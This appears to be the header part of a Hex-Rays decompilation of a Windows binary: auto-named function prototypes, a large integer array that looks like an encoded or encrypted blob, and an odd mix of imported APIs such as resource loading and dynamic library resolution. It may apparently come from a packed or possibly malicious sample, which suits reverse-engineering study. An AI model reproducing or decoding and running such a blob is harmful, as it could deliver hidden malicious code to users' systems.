/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

DWORD sub_401000();
int __cdecl sub_40102B(char *Str, char *Source); // idb
char *__cdecl sub_401091(DWORD dwMessageId);
int __cdecl sub_4011AB(char *Str); // idb
DWORD sub_4011FE();
DWORD sub_401208();
int sub_40128B();
char *__cdecl sub_4013BA(char *Str);
bool __cdecl sub_4013DB(unsigned int *Src, size_t Size, _BYTE *a3);
void **__cdecl sub_401427(void **a1);
_DWORD *__cdecl sub_4014AE(int a1);
BOOL __cdecl sub_4014E3(char *Str, int a2);
int sub_40155C();
CHAR *__cdecl sub_401871(int a1, char *Source);
int __cdecl sub_40191B(unsigned __int8 *Str2, int a2); // idb
CHAR *__cdecl sub_401962(LPCWCH lpWideCharStr);
int sub_401989();
int sub_401A13();
char sub_401ADC();
void **__thiscall sub_401D04(void **this, char *Str);
int __thiscall sub_401D6D(void **this);
int __thiscall sub_401DA9(void **this, char a2, size_t Size);
void **__fastcall sub_401E36(int a1, int a2, _BYTE *Src, size_t Size);
void **__thiscall sub_401EF7(void **this, void **a2, unsigned int a3, size_t a4);
BOOL __thiscall sub_401FFD(int this, unsigned int a2, char a3);
bool __fastcall sub_4020DF(_DWORD *a1, int a2, unsigned int a3);
_DWORD *__thiscall sub_402142(_DWORD *this, unsigned int a2, unsigned int a3);
int __thiscall sub_402225(void **this, int a2, size_t Size);
void __thiscall sub_40245D(std::exception *this);
std::exception *__thiscall sub_402477(std::exception *this, char a2);
std::exception *__thiscall sub_4024A7(std::exception *this, struct exception *a2);
DWORD __cdecl sub_4024C9(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);
bool sub_402649();
char sub_402658();
int sub_4026A5();
int __cdecl sub_4026D6(int a1, DWORD a2);
unsigned int __stdcall StartAddress(void *a1); // idb
int __cdecl sub_4028D8(char a1);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
int __cdecl Take(int a1, int a2);
HWND __stdcall sub_404176(int a1, int a2, int a3);
int __cdecl sub_404498(int a1);
int sub_4055D5();
int __cdecl sub_40589A(HINSTANCE hInstance); // idb
void *__thiscall sub_4086FC(void *this);
BOOL __thiscall sub_408708(bool *this, HWND a2);
int __stdcall sub_4087BE(char a1);
void sub_408852();
_BYTE *__thiscall sub_40885B(_BYTE *this);
char __thiscall sub_408876(_BYTE *this, int a2);
void sub_4088B5();
void **__thiscall sub_4088C6(void **this);
void **__thiscall sub_408908(void **this);
int __thiscall sub_40894A(void *this);
int __thiscall sub_408982(int this, _BYTE *a2);
int __thiscall sub_408A46(_DWORD *this);
int __thiscall sub_408A89(void **this);
int __thiscall sub_408AAB(_DWORD *this, _WORD *a2);
_DWORD *__thiscall sub_408B83(_DWORD *this);
int __thiscall sub_408C22(_DWORD *this, _WORD *a2);
int __thiscall sub_408CFA(int this);
unsigned int __thiscall sub_408DAE(void **this, int a2);
int __thiscall sub_408E24(int this);
int __thiscall sub_408E70(_DWORD *this, _DWORD *a2);
int __thiscall sub_408F48(_DWORD *this);
int __thiscall sub_408FBC(_DWORD *this, _DWORD *a2);
int __thiscall sub_409094(int this);
void **__thiscall sub_409148(void **this);
_DWORD *__thiscall sub_4091A1(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_4091F3(_DWORD *this);
unsigned int __thiscall sub_40928E(int this, unsigned int a2);
void **__thiscall sub_40961B(void **this, int a2);
unsigned int __thiscall sub_4096AB(void **this, size_t a2);
unsigned int __thiscall sub_4097E2(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_409849(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_4098A1(_DWORD *this);
unsigned int __thiscall sub_40993C(int this, unsigned int a2);
_DWORD *__thiscall sub_409CC9(_DWORD *this, _DWORD *a2, int a3);
int __thiscall sub_409D68(int **this);
int __thiscall sub_409DD6(int **this);
HRESULT __cdecl sub_409E44(D2D1_FACTORY_TYPE factoryType, void **ppIFactory);
_BYTE *__cdecl sub_409E5B(int a1, _BYTE *a2, _BYTE *a3);
_BYTE *__cdecl sub_409E8B(int a1, _BYTE *a2, _BYTE *a3);
_WORD *__cdecl sub_409EC1(int a1, _WORD *a2, _WORD *a3);
_WORD *__cdecl sub_409EF3(int a1, _WORD *a2, _WORD *a3);
_DWORD *__cdecl sub_409F2B(int a1, _DWORD *a2, _DWORD *a3);
_DWORD *__cdecl sub_409F5B(int a1, _DWORD *a2, _DWORD *a3);
void sub_409F91();
_DWORD *__cdecl sub_409F96(int a1, _DWORD *a2, _DWORD *a3);
void *__cdecl sub_409FCC(unsigned int a1);
void *__cdecl sub_40A02A(unsigned int a1);
void *__cdecl sub_40A089(size_t Size);
void *__cdecl sub_40A0E1(unsigned int a1);
// size_t __cdecl strlen(const char *Str);
// int sprintf(char *const Buffer, const char *const Format, ...);
// char *__cdecl strcpy(char *Destination, const char *Source);
// char *__cdecl strrchr(const char *Str, int Ch);
// char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct localeinfo_struct *); idb
// unsigned int __cdecl strtoul(const char *String, char **EndPtr, int Radix);
// int __cdecl fclose(FILE *Stream);
// char *__cdecl fgets(char *Buffer, int MaxCount, FILE *Stream);
// int *__cdecl _errno();
// FILE *__cdecl fopen(const char *FileName, const char *Mode);
// int fprintf(FILE *const Stream, const char *const Format, ...);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
// char *__cdecl strchr(const char *Str, int Val);
// int __cdecl _vsnprintf(char *const Buffer, const size_t BufferCount, const char *const Format, va_list ArgList);
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// void *__cdecl memset(void *, int Val, size_t Size);
// void *__cdecl operator new(size_t Size); idb
// int __cdecl _ismbcdigit(unsigned int C);
// int __cdecl atoi(const char *String);
// int __cdecl _mbsnbicmp(const unsigned __int8 *Str1, const unsigned __int8 *Str2, size_t MaxCount);
// void *__cdecl operator new[](unsigned int); idb
// int __cdecl _mbscmp(const unsigned __int8 *Str1, const unsigned __int8 *Str2);
// int printf(const char *const Format, ...);
void __cdecl sub_40BB07(void *a1);
// void __cdecl operator delete(void *); idb
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl memcpy_0(void *, const void *Src, size_t Size);
// void __thiscall std::exception::_Tidy(std::exception *__hidden this); idb
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const char *const *); idb
void __thiscall sub_40C2D5(std::exception *this);
std::exception *__thiscall sub_40C2E0(std::exception *this, char a2);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct exception *); idb
void __thiscall sub_40C32C(struct type_info *this);
struct type_info *__thiscall sub_40C33C(struct type_info *this, char a2);
// uintptr_t __cdecl _beginthreadex(void *Security, unsigned int StackSize, _beginthreadex_proc_type StartAddress, void *ArgList, unsigned int InitFlag, unsigned int *ThrdAddr);
// void __cdecl free(void *Block);
// void *__cdecl malloc(size_t Size);
// double __cdecl ceil(double X);
// double __cdecl sin(double X);
// double __cdecl asin(double X);
// double __cdecl exp(double X);
// double __cdecl cos(double X);
// double __cdecl log10(double X);
void *__cdecl sub_40D9C9(void *a1);
// void __cdecl _invalid_parameter_noinfo();
// int _encoded_null(void); weak
int sub_40F3BC();
// int __cdecl _fileno(FILE *Stream);
// _DWORD __cdecl flsall(_DWORD); weak
// int __cdecl fflush(FILE *Stream);
int sub_4106B3();
void **sub_4106BC();
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
void __thiscall sub_4115A2(std::exception *this);
std::exception *__thiscall sub_4115AD(std::exception *this, char a2);
std::exception *__thiscall sub_412177(std::exception *this, struct exception *a2);
int sub_412416();
void *__cdecl sub_412560(void *a1);
// int __cdecl strcmp(const char *Str1, const char *Str2);
// void __cdecl type_info::_Type_info_dtor(struct type_info *); idb
// void __cdecl __noreturn _exit(int Code);
int sub_413486();
int __cdecl sub_414C04(int a1, int a2);
// _DWORD __cdecl CallDestructExceptionObject(_DWORD, _DWORD); weak
// LONG __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
int sub_4151D8();
void *sub_41560D();
void __cdecl sub_415633(); // idb
int __cdecl sub_416ECE(_DWORD *a1);
// int __cdecl _setmode(int FileHandle, int Mode);
void sub_417410();
int __cdecl sub_417F06(_DWORD *a1, int a2, struct localeinfo_struct *a3);
int __cdecl sub_417FAE(_DWORD *a1, int a2, struct localeinfo_struct *a3);
PVOID sub_418816();
// int __cdecl raise(int Signal);
int __cdecl sub_4189C6(int a1);
int __cdecl sub_4189D5(int a1);
int __cdecl sub_418B13(int a1, int a2, int a3);
int sub_418E7E();
int __cdecl sub_419D0A(unsigned __int16 *a1, _DWORD *a2);
int __cdecl sub_41A25B(unsigned __int16 *a1, _DWORD *a2);
// _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
HANDLE sub_41BC7C();
// BOOL __stdcall GetFileVersionInfoW(LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
void sub_41BE80();
int __cdecl sub_41BEC0(_DWORD *a1);
unsigned int *__cdecl sub_41BF20(unsigned int *a1, int a2);
int __cdecl sub_41D000(_DWORD *a1, unsigned int *Src, size_t Size);
int __cdecl sub_41D0E0(_BYTE *a1, int *a2);
int __cdecl sub_41D3C0(int a1, int a2);
void __cdecl sub_41D3D0(_DWORD *Block);
_BYTE *__cdecl sub_41D460(unsigned int *Src, size_t Size, _BYTE *a3);
void sub_41D4F0();
int sub_41D580(); // weak
int __cdecl sub_41D5C0(_DWORD *a1, _DWORD *a2);
int sub_41D5D0(); // weak
int __cdecl sub_41D5F0(unsigned __int8 *, unsigned __int8 *);
_DWORD *__cdecl sub_41D600(int a1);
_DWORD *__cdecl sub_41D680(int a1);
void sub_41D740();
int (__cdecl *__cdecl sub_41D840(char *Block))(_DWORD, _DWORD);
// void __usercall sub_41D890(_DWORD *a1@<ecx>, int a2@<ebx>);
int __cdecl sub_41D930(unsigned int a1);
_DWORD *sub_41D9C0();
int *__cdecl sub_41DAC0(int a1, int a2);
void sub_41DBE0();
void __cdecl sub_41DC20(int a1, _DWORD *a2);
int (__cdecl *__cdecl sub_41DC70(unsigned __int8 a1, __int16 a2, __int16 a3, int a4, int a5))(_DWORD, _DWORD);
int *sub_41DD50(int a1, ...);
int __cdecl sub_41DD70(void *Buf, size_t MaxCount); // idb
char *__cdecl sub_41DDC0(unsigned int a1);
char *__cdecl sub_41DE60(unsigned int a1, int a2, int **a3);
int __cdecl sub_41DFC0(void *Block, size_t Size); // idb
_BYTE *__cdecl sub_41DFF0(signed int Size, int a2, int a3);
_BYTE *__cdecl sub_41E080(size_t Size, int a2, int a3);
_BYTE *__cdecl sub_41E0B0(void *Block, signed int Size, int a3, int a4);
int (__cdecl *__cdecl sub_41E130(void *Block))(_DWORD, _DWORD);
void __cdecl sub_41E170(int a1);
int __cdecl sub_41E240(int a1);
void __cdecl sub_41E2C0(int a1, int a2, int a3, int a4);
int __cdecl sub_41E340(_DWORD *a1, int a2, int a3, int a4, int a5);
int __cdecl sub_41E390(_DWORD *a1);
unsigned int *__cdecl sub_41E3D0(int *a1, unsigned int *a2, int a3);
int __cdecl sub_41F920(int *a1, unsigned int *Src, size_t Size);
int __cdecl sub_41FA00(_BYTE *a1, int a2);
void sub_41FB70();
void sub_41FBA0();
void sub_41FBD0();
void sub_41FC00();
void sub_41FC30();
void sub_41FC60();
void sub_41FC90();
void sub_41FCC0();
void sub_41FCF0();
void sub_41FD20();
void sub_41FD50();
void sub_41FD80();
void sub_41FDB0();
void sub_41FDE0();
void sub_41FE10();
void sub_41FE40();
void sub_41FE70();
void sub_41FEA0();
void sub_41FED0();
void sub_41FF00();
void sub_41FF30();
void sub_41FF60();
void sub_41FF90();
void sub_41FFC0();
void sub_41FFF0();
void sub_420020();
BOOL sub_420050();
int __cdecl sub_4200D0(int a1);
int sub_420110();
int __cdecl sub_420190(int a1, int a2, int a3);
BOOL sub_420360();
// unsigned int __usercall sub_4204B0@<eax>(unsigned int *a1@<esi>);
// _BYTE *__usercall sub_420590@<eax>(int a1@<esi>);
// int __usercall sub_420620@<eax>(int a1@<esi>, int a2, unsigned int *a3);
int __cdecl sub_4206A0(char *a1);
_DWORD *__cdecl sub_4206F0(int (__cdecl *a1)(char *a1), int (__cdecl *a2)(const char *Str1, const char *Str2));
_DWORD *__cdecl sub_420770(unsigned int *a1, int a2);
int __cdecl sub_420800(_DWORD *a1, int a2);
_DWORD *__cdecl sub_420870(int a1, int a2);
DWORD __cdecl sub_4208A0(_DWORD *a1);
int __cdecl sub_4208C0(unsigned __int8 *a1, unsigned __int8 *a2);
int __cdecl sub_420920(_DWORD *a1, _DWORD *a2);
int __cdecl sub_420940(int a1);
int __cdecl sub_420950(char *a1, const char *a2, unsigned int a3);
int __cdecl sub_420990(char *a1, const char *a2, unsigned int a3);
int __cdecl sub_4209F0(int *a1, int a2, int a3);
int __cdecl sub_420A90(int *a1, int a2);
int (__cdecl *__cdecl sub_420AB0(void **Block))(_DWORD, _DWORD);
int __cdecl sub_420AD0(int a1);
int __cdecl sub_420AE0(int *a1, int a2);
int __cdecl sub_420B00(int *a1, int a2, int a3);
_DWORD *sub_420B30();
int sub_420B90();
HANDLE sub_420CD0(char *Format, ...);
void __cdecl __noreturn sub_420E20(const char *ArgList, int a2, const char *a3);
// FILE *__usercall sub_420E50@<eax>(const char *a1@<ebx>, char *a2);
int __cdecl sub_420FC0(_DWORD *a1);
int __cdecl sub_420FE0(int a1);
size_t __cdecl sub_421030(int a1, void *Buffer, size_t ElementCount);
size_t __cdecl sub_4210B0(int a1, void *Buffer, size_t ElementSize);
int __cdecl sub_4210E0(int a1, int a2, int Offset, FILE *Stream); // idb
unsigned int __cdecl sub_4213E0(int a1, char *Buffer, int MaxCount);
size_t __cdecl sub_421430(int a1, const char *Buffer);
std::exception *__thiscall sub_421478(std::exception *this, struct exception *a2);
// void __cdecl __noreturn std::_Xlength_error(const char *); idb
std::exception *__thiscall sub_4214C5(std::exception *this, struct exception *a2);
// void __cdecl __noreturn std::_Xout_of_range(const char *); idb
std::exception *__thiscall sub_421512(std::exception *this, struct exception *a2);
std::exception *__thiscall sub_42152F(std::exception *this, char a2);
// BOOLEAN __stdcall GetActivePwrScheme(PUINT puiID);
// DWORD __stdcall RasEnumConnectionsA(struct tagRASCONNA *, LPDWORD, LPDWORD);
// LONG __stdcall lineConfigProvider(HWND hwndOwner, DWORD dwPermanentProviderID);
// HRESULT __stdcall D2D1CreateFactory(D2D1_FACTORY_TYPE factoryType, const IID *const riid, const D2D1_FACTORY_OPTIONS *pFactoryOptions, void **ppIFactory);
// char *__cdecl strerror(int ErrorMessage);
// void *__cdecl memchr(const void *Buf, int Val, size_t MaxCount);
// wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr);
// FILE *__cdecl _wfopen(const wchar_t *FileName, const wchar_t *Mode);
// int __cdecl feof(FILE *Stream);
// int __cdecl ferror(FILE *Stream);
// size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// int __cdecl ftell(FILE *Stream);
// int __cdecl fseek(FILE *Stream, int Offset, int Origin);
void *sub_421E15();
char **sub_421E1B();
// int __cdecl _sopen_helper_0(LPCWSTR lpFileName, int, int, int, int, int); idb
int __cdecl sub_422AB9(int a1, LPCWSTR lpFileName, int a3, int a4, int a5); // idb
void __cdecl sub_422ED6(); // idb
// int __stdcall DWriteCreateFactory(_DWORD, _DWORD, _DWORD); weak

//-------------------------------------------------------------------------
// Data declarations

int dword_402B10[512] =
{
  1896539036,
  -374176358,
  -801600412,
  -254255032,
  -1912131388,
  1275488160,
  393764463,
  -836814762,
  -2052315636,
  1021809527,
  1620422856,
  -46890874,
  -1539849877,
  -2083185626,
  -163663681,
  931427983,
  1466906934,
  -661592697,
  -801641096,
  -254255032,
  232278001,
  470006423,
  394033519,
  -1889001351,
  222234093,
  669494391,
  -1774862648,
  -1224858039,
  977042034,
  -1389230315,
  -92438724,
  -636023759,
  822919077,
  396468922,
  -809024425,
  -876488245,
  -672842890,
  1821650182,
  364218242,
  938856513,
  -2098483103,
  -1590565089,
  -789281626,
  -254255032,
  232278001,
  -178476721,
  -771755871,
  -1389747208,
  1598556591,
  -1185059452,
  1747323288,
  -1208006778,
  421474529,
  2109501388,
  1579805039,
  1884826624,
  1599653745,
  -2124986200,
  -1728344980,
  1007987757,
  -717453009,
  836702337,
  1612810008,
  900234503,
  -1723882383,
  10086316,
  -1785936793,
  1772047561,
  -1603188924,
  -176902457,
  -771757919,
  1086433252,
  1435508007,
  -1184911343,
  -524744828,
  -1257708409,
  435370217,
  2085940276,
  394127332,
  2115492945,
  752993573,
  1999907279,
  1422883881,
  -1218519140,
  431963377,
  -2145818848,
  367263975,
  -383795127,
  -1789124920,
  -1406430277,
  1276692975,
  -1008045204,
  1349646171,
  836750769,
  1075939092,
  -158295285,
  1464076717,
  -1453351927,
  -525269104,
  -1247893369,
  431961313,
  -1756362948,
  397688646,
  -1269403167,
  276332580,
  806920328,
  -801619800,
  -254255032,
  -539473935,
  970968104,
  1748076008,
  -1134007869,
  464800804,
  -53177343,
  1496550500,
  1007987828,
  -683858012,
  -1109975927,
  1815709157,
  -2023458417,
  1371256945,
  -53187259,
  536660463,
  882793665,
  -673218260,
  -1371538287,
  1679888360,
  896039175,
  -552818575,
  -673944508,
  -1275356127,
  -1826923327,
  -1665671967,
  972809174,
  1613858072,
  1473878539,
  1414529303,
  -1453355255,
  211914648,
  400877839,
  -214224671,
  2038859540,
  361519591,
  -249572271,
  -646590500,
  -1993858691,
  -123664527,
  -1224410705,
  -1671480095,
  1938091971,
  361519435,
  -249637807,
  821675207,
  1960589774,
  1501520177,
  -1068388484,
  570766375,
  1813604297,
  -1820922587,
  896295339,
  -1590184855,
  -241144748,
  536664559,
  2040421585,
  -1221180344,
  1947822031,
  377766375,
  -1390624431,
  -542897745,
  -1175613439,
  -1746536064,
  -176177975,
  -1199970398,
  -173497913,
  -1784680279,
  -1083672177,
  -1992447887,
  76670904,
  1627965791,
  1007097235,
  287296676,
  838591444,
  -774175972,
  -247782404,
  553240024,
  53118637,
  1091635099,
  -267083706,
  1546964044,
  -1126714172,
  216322017,
  738507924,
  1277484212,
  1816460500,
  -1939596044,
  -1400620012,
  -861643724,
  -322667436,
  216308852,
  738507924,
  1277484212,
  1816460500,
  -1939596044,
  -1400620012,
  -861643724,
  -322667436,
  216308852,
  738507924,
  1277484212,
  1816460500,
  -1939596044,
  -1400620012,
  -861643724,
  -322667436,
  216308852,
  738507924,
  276356276,
  806920328,
  -801619800,
  -254255032,
  -539473935,
  163356712,
  361493275,
  830273601,
  1431024600,
  -1933802495,
  -1757083135,
  -733723455,
  -1546964504,
  -139155123,
  -905979735,
  2055579108,
  450540641,
  983602433,
  -628066783,
  -92776511,
  -1705496351,
  -1168895615,
  1511383201,
  2062598465,
  448963169,
  984974081,
  -628851679,
  -92447295,
  -1710801183,
  -1167712383,
  292878497,
  1136972865,
  -1724011407,
  277996028,
  -56528076,
  1422977293,
  -1790389413,
  750561615,
  1669918476,
  1959896571,
  1465909679,
  -1386372079,
  1757799520,
  2040517432,
  -1780704180,
  -173337800,
  -771770207,
  146909136,
  -1263002195,
  830970265,
  1276955119,
  -1008204948,
  -1871624869,
  -142565041,
  -839008079,
  -1310833636,
  -1723906582,
  1765555372,
  -1794411624,
  1906275521,
  -2073999504,
  340311373,
  -829806020,
  -332633713,
  591935436,
  412214715,
  -1759460881,
  1839024337,
  1118413972,
  970952623,
  -40084468,
  896259064,
  -1858105247,
  545384336,
  1958272493,
  1764749564,
  215779631,
  -2086098132,
  540116251,
  926966159,
  -1925320591,
  -1429863404,
  1501511821,
  301792364,
  -708103336,
  836709505,
  1545701168,
  -725582451,
  1814518224,
  -1405343281,
  -485974132,
  -330226309,
  -673152721,
  769473681,
  -1047427140,
  1884872903,
  1599653745,
  -113483608,
  -1794411622,
  2040485057,
  1350322012,
  -2086624947,
  -376766319,
  1220662028,
  1464338861,
  425693185,
  486297145,
  -254255032,
  -539473935,
  -1447239640,
  361493273,
  -115354559,
  -1862481956,
  52437453,
  1225491473,
  -1068423824,
  -674723537,
  2023141665,
  1354285284,
  1884872904,
  1599653745,
  1497129128,
  -1794411623,
  2040485057,
  1148995420,
  -2086624947,
  -376759151,
  -1260268792,
  1430264283,
  -1184919551,
  1091635096,
  -267083706,
  -539473935,
  163373096,
  361493273,
  -115354559,
  -1057175588,
  52437453,
  1762367505,
  811684756,
  -1556301477,
  970791057,
  1613858584,
  2127153551,
  276319284,
  806920328,
  -801619800,
  -254255032,
  -539473935,
  1237114920,
  361493273,
  -111946687,
  -592163624,
  76670788,
  -1782266641,
  1772050633,
  431988408,
  836746460,
  -906011152,
  -115376620,
  1807424552,
  59073545,
  1501526065,
  1643194232,
  -1875585946,
  -1332207608,
  1354285096,
  1884872904,
  -1923561615,
  1977362895,
  1367306273,
  742467476,
  -717937113,
  -1244529519,
  -637594992,
  -1327913204,
  -868459090,
  2145135055,
  1501400484,
  811149196,
  -717943513,
  -1363156855,
  394807663,
  -1336512031,
  276332580,
  806920328,
  -801619800,
  -254255032,
  -539473935,
  970966056,
  1144096236,
  899178895,
  -1720479639,
  -53187424,
  -525251740,
  1007987844,
  1557956963,
  -145429308,
  -637546319,
  882681564,
  14796590,
  1976938183,
  1501515825,
  1037315932,
  -538146515,
  1934886073,
  -1669970079,
  1691984132,
  -554785675,
  945253444,
  322177376,
  1008116480,
  -2074000988,
  2115110038,
  1492585700,
  -1286297344,
  -592141152,
  613540164,
  516318260,
  -124277628,
  687098272,
  -1877922904,
  -1670116124,
  -1200854589,
  934562852,
  77195085,
  -1779079705,
  1100436681,
  1262537820,
  780974409,
  -1669984500,
  -1202671868,
  1364722095,
  -1453513648,
  -1624348792,
  1209286905,
  -2140059716,
  -138892817,
  -1929457495,
  -115393140,
  -579547144,
  386410957,
  -1061615765,
  -1223381694,
  -1632169743,
  -1610521147,
  -1668789981,
  1469328388,
  82954051,
  1977408075,
  1233084457,
  1037447004,
  -672360147,
  -1663631231,
  -1632333851,
  929327501,
  895852649,
  -2009587251,
  -1745000625,
  -694723375,
  -1402911323,
  2091159879,
  -637594480,
  1355876312,
  1449656751,
  2009457748,
  -596160479,
  -531552891,
  1541346639,
  2109516035,
  393481444,
  -249708471,
  552700880,
  -53187515,
  485858701,
  -465493628,
  1569596662,
  -1193808700,
  1882293728,
  -1134014073,
  -1590229679,
  -1079939416,
  -1795110417,
  1905868993,
  -975397508,
  -11211579,
  -637728736,
  933087220,
  909622385,
  209839429,
  470086119,
  2040509680,
  -1334712456,
  -158817969,
  392529140,
  2081943617
}; // weak
// extern HANDLE (__stdcall *RegisterEventSourceA)(LPCSTR lpUNCServerName, LPCSTR lpSourceName);
// extern BOOL (__stdcall *DeregisterEventSource)(HANDLE hEventLog);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern BOOL (__stdcall *ReportEventA)(HANDLE hEventLog, WORD wType, WORD wCategory, DWORD dwEventID, PSID lpUserSid, WORD wNumStrings, DWORD dwDataSize, LPCSTR *lpStrings, LPVOID lpRawData);
// extern BOOL (__stdcall *ChooseColorA)(LPCHOOSECOLORA);
// extern BOOL (__stdcall *GetSaveFileNameW)(LPOPENFILENAMEW);
// extern int (__stdcall *ExcludeClipRect)(HDC hdc, int left, int top, int right, int bottom);
// extern BOOL (__stdcall *SetBrushOrgEx)(HDC hdc, int x, int y, LPPOINT lppt);
// extern HDC (__stdcall *CreateDCA)(LPCSTR pwszDriver, LPCSTR pwszDevice, LPCSTR pszPort, const DEVMODEA *pdm);
// extern int (__stdcall *GetDIBits)(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);
// extern HDC (__stdcall *CreateCompatibleDC)(HDC hdc);
// extern HBITMAP (__stdcall *CreateCompatibleBitmap)(HDC hdc, int cx, int cy);
// extern HGDIOBJ (__stdcall *SelectObject)(HDC hdc, HGDIOBJ h);
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern BOOL (__stdcall *DeleteDC)(HDC hdc);
// extern HPEN (__stdcall *CreatePen)(int iStyle, int cWidth, COLORREF color);
// extern int (__stdcall *SetROP2)(HDC hdc, int rop2);
// extern BOOL (__stdcall *Rectangle)(HDC hdc, int left, int top, int right, int bottom);
// extern BOOL (__stdcall *MoveToEx)(HDC hdc, int x, int y, LPPOINT lppt);
// extern BOOL (__stdcall *LineTo)(HDC hdc, int x, int y);
// extern HBITMAP (__stdcall *CreateDIBSection)(HDC hdc, const BITMAPINFO *pbmi, UINT usage, void **ppvBits, HANDLE hSection, DWORD offset);
// extern BOOL (__stdcall *StretchBlt)(HDC hdcDest, int xDest, int yDest, int wDest, int hDest, HDC hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, DWORD rop);
// extern BOOL (__stdcall *BitBlt)(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
// extern BOOL (__stdcall *TextOutA)(HDC hdc, int x, int y, LPCSTR lpString, int c);
// extern int (__stdcall *GetObjectA)(HANDLE h, int c, LPVOID pv);
// extern int (__stdcall *GetPath)(HDC hdc, LPPOINT apt, LPBYTE aj, int cpt);
// extern HANDLE (__stdcall *CreateEventW)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
// extern BOOL (__stdcall *GetVolumeInformationA)(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern BOOL (__stdcall *EnumSystemGeoID)(GEOCLASS GeoClass, GEOID ParentGeoId, GEO_ENUMPROC lpGeoEnumProc);
// extern BOOL (__stdcall *DeviceIoControl)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
// extern HGLOBAL (__stdcall *GlobalFree)(HGLOBAL hMem);
// extern BOOL (__stdcall *FreeResource)(HGLOBAL hResData);
// extern LPVOID (__stdcall *LockResource)(HGLOBAL hResData);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern HRSRC (__stdcall *FindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern BOOL (__stdcall *GlobalUnlock)(HGLOBAL hMem);
// extern LPVOID (__stdcall *GlobalLock)(HGLOBAL hMem);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HGLOBAL (__stdcall *GlobalAlloc)(UINT uFlags, SIZE_T dwBytes);
// extern DWORD (__stdcall *GetLastError)();
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern DWORD (__stdcall *GetVersion)();
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern BOOL (__stdcall *CancelIoEx)(HANDLE hFile, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *IsProcessorFeaturePresent)(DWORD ProcessorFeature);
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *ResetEvent)(HANDLE hEvent);
// extern BOOL (__stdcall *SetupComm)(HANDLE hFile, DWORD dwInQueue, DWORD dwOutQueue);
// extern BOOL (__stdcall *SetCommState)(HANDLE hFile, LPDCB lpDCB);
// extern BOOL (__stdcall *SetCommTimeouts)(HANDLE hFile, LPCOMMTIMEOUTS lpCommTimeouts);
// extern HANDLE (__stdcall *CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
